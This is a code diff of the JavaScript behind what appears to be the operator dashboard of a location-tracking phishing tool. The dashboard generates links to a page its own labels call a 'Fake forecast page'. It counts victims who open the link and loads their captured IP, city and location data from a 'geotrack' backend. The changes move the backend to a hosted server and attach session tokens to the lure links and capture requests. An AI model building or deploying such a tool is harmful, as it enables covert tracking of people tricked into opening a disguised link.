@@ -1091,11 +1091,20 @@ textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,245,255,.1
      JAVASCRIPT — COMPLETE
 ══════════════════════════════════════════ -->
 <script>
-var SRV = 'https://forecastlive-api.onrender.com';
+var SRV = 'https://geotrack-backend-z0x1.onrender.com';
 var mainMap=null, ipMap=null, capMap=null;
 var mainM=null, ipM=null, capMs=[];
 var online=false, ngrokUrl=null;
 var sg=0, so=0, lastCap=0, capTimer=null;
+var SESSION_TOKEN = null;
+
+/* ── SESSION INIT ──────────────────── */
+function initSession() {
+  fetch(SRV + '/api/session')
+    .then(function(r){ return r.json(); })
+    .then(function(d){ SESSION_TOKEN = d.token; fetchNgrok(); })
+    .catch(function(){ fetchNgrok(); });
+}
 
 /* ── TOAST ─────────────────────────── */
 function toast(msg, err) {
@@ -1140,7 +1149,7 @@ function checkSrv() {
         document.getElementById('my-isp').textContent = d.isp || '—';
         document.getElementById('my-city').textContent= d.city|| '—';
       }
-      fetchNgrok();
+      if (!SESSION_TOKEN) { initSession(); } else { fetchNgrok(); }
     })
     .catch(function(){
       online = false;
@@ -1154,19 +1163,13 @@ function checkSrv() {
 }
 
 function fetchNgrok() {
-  fetch(SRV + '/api/ngrok-url')
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      ngrokUrl = d.url;
-      var wu = ngrokUrl + '/forecast/world';
-      document.getElementById('ntxt').textContent = wu;
-      var isN = ngrokUrl.includes('ngrok') || ngrokUrl.includes('loca.lt');
-      document.getElementById('sngrok').textContent = 'NGROK: ' + (isN ? 'ACTIVE' : 'LOCAL');
-      document.getElementById('fl-ngrok').textContent = isN ? '✓ ACTIVE' : 'LOCAL only';
-      // Footer ngrok sync
-      var fn = document.getElementById('ftr-ngrok');
-      if(fn){ fn.textContent = isN ? 'ACTIVE' : 'LOCAL'; fn.style.color = isN ? 'var(--green)' : 'var(--gold)'; }
-    }).catch(function(){});
+  ngrokUrl = SRV;
+  var weatherUrl = SRV + '/forecast/world' + (SESSION_TOKEN ? '?t=' + SESSION_TOKEN : '');
+  document.getElementById('ntxt').textContent = weatherUrl;
+  document.getElementById('sngrok').textContent = 'LINK: ACTIVE';
+  document.getElementById('fl-ngrok').textContent = '✓ LIVE';
+  var fn = document.getElementById('ftr-ngrok');
+  if(fn){ fn.textContent = 'LIVE'; fn.style.color = 'var(--green)'; }
 }
 
 checkSrv();
@@ -1480,23 +1483,22 @@ document.getElementById('gps-btn').addEventListener('click', function(){
   );
 });
 
-/* ── FAKE LINK BUTTONS ─────────────── */
 document.getElementById('ref-ngrok').addEventListener('click', function(){
-  fetchNgrok(); toast('🔄 Ngrok URL refresh...');
+  fetchNgrok(); toast('🔄 Link refreshed!');
 });
 
 document.getElementById('copy-ngrok').addEventListener('click', function(){
   var t = document.getElementById('ntxt').textContent;
-  if (t.includes('server.py')) { toast('⚠ Please start server.py first!', true); return; }
+  if (!t || t === '—') { toast('⚠ Server online nahi hai!', true); return; }
   cpText(t);
 });
 
 document.getElementById('open-weather').addEventListener('click', function(){
-  var url = ngrokUrl ? ngrokUrl + '/forecast/world' : SRV + '/forecast/world';
+  var url = SRV + '/forecast/world' + (SESSION_TOKEN ? '?t=' + SESSION_TOKEN : '');
   window.open(url, '_blank');
   so++; document.getElementById('so').textContent = so;
   sg++; document.getElementById('sg').textContent = sg;
-  toast('🌤 Fake weather page opened!');
+  toast('🌍 Fake forecast page opened!');
 });
 
 document.getElementById('ref-caps').addEventListener('click', function(){
@@ -1518,7 +1520,7 @@ function cpText(t) {
 /* ── LOAD CAPTURES ─────────────────── */
 function loadCaps() {
   if (!online) return;
-  fetch(SRV + '/api/captures')
+  fetch(SRV + '/api/captures?token=' + (SESSION_TOKEN || ''))
     .then(function(r){ return r.json(); })
     .then(function(data){
       document.getElementById('sc').textContent = data.length;
